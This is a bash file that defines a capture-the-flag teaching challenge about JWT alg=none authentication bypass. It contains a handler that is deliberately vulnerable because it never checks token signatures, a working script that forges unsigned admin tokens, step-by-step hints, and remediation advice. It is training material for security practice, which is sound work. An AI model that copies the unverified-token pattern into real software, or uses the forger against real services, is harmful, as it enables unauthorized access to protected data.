#!/usr/bin/env bash
# =============================================================================
#  Hard — Bearer Token Forgery: Auth Bypass
#  Teaching room (devise_token_auth Bearer). The admin API decodes the JWT
#  payload but never verifies the signature (accepts alg=none) — forge an admin
#  token to reach the cloud-keys endpoint.
# =============================================================================

token_provision() { :; }

token_handle() {
  [[ "$REQ_PATH" == /api/admin/keys ]] || { mw_resp "404 Not Found" '{"error":"unknown route"}'; return; }
  local auth tok payload dec low
  auth="$(mw_hdr Authorization)"
  if [[ "$auth" != Bearer\ * && "$auth" != bearer\ * ]]; then
    mw_resp "401 Unauthorized" '{"error":"missing bearer token"}'; return
  fi
  tok="${auth#* }"                       # strip "Bearer "
  payload="${tok#*.}"; payload="${payload%%.*}"   # middle JWT segment
  dec="$(mw_b64d "$payload")"
  low="$(printf '%s' "$dec" | tr '[:upper:]' '[:lower:]' | tr -d ' ')"
  if [[ "$low" == *'"role":"admin"'* || "$low" == *'"admin":true'* || "$low" == *'"uid":1'* || "$low" == *'"uid":"1"'* ]]; then
    mw_resp "200 OK" "{\"cloud_keys\":\"$(flags_plaintext hard-token)\"}"
  else
    mw_resp "403 Forbidden" "{\"error\":\"token accepted but not admin\",\"you_are\":\"$dec\"}"
  fi
}

token_toolkit() {
  local id="$1"
  toolkit_install_helper "$id" "jwt-forge.sh" \
"#!/usr/bin/env bash
# Forge an UNSIGNED (alg=none) JWT.  usage: ./jwt-forge.sh '{\"uid\":1,\"role\":\"admin\"}'
b64() { printf '%s' \"\$1\" | base64 | tr '+/' '-_' | tr -d '=\n'; }
h=\$(b64 '{\"alg\":\"none\",\"typ\":\"JWT\"}')
p=\$(b64 \"\${1:-{\\\"uid\\\":1,\\\"role\\\":\\\"admin\\\"}}\")
echo \"\$h.\$p.\"
# then: ./colab-http GET /api/admin/keys -H \"Authorization: Bearer <token>\""
}

register_challenge \
  id="hard-token" \
  title="Bearer Token Forgery: Auth Bypass - Hard" \
  diff="Hard" points="500" penalty="70" \
  owasp="A07:2021 Identification & Authentication Failures" \
  cvss="8.8 (AV:N/PR:N)" \
  slug="forged_bearer_admin" \
  finding="Teaching room — token forgery was tested and held up in the real engagement" \
  endpoint="GET /api/admin/keys  (Authorization: Bearer <jwt>)" \
  tools="curl,httpie,jq,base64" \
  scenario="The admin API uses devise_token_auth Bearer tokens. This build decodes the JWT payload to read the user's role but forgets to verify the signature, so it happily accepts alg=none tokens." \
  objective="Forge an admin Bearer token (no valid signature needed) and pull the cloud keys flag." \
  remediation="Verify token signatures with the server secret; reject alg=none; pin allowed algorithms." \
  hints="A JWT is header.payload.signature — the server only reads the middle (payload) segment.
Set the payload to an admin identity and use alg=none so no signing is required.
Run ./jwt-forge.sh '{\"uid\":1,\"role\":\"admin\"}' then send it as the Authorization: Bearer header." \
  provision="token_provision" toolkit="token_toolkit" handler="token_handle"
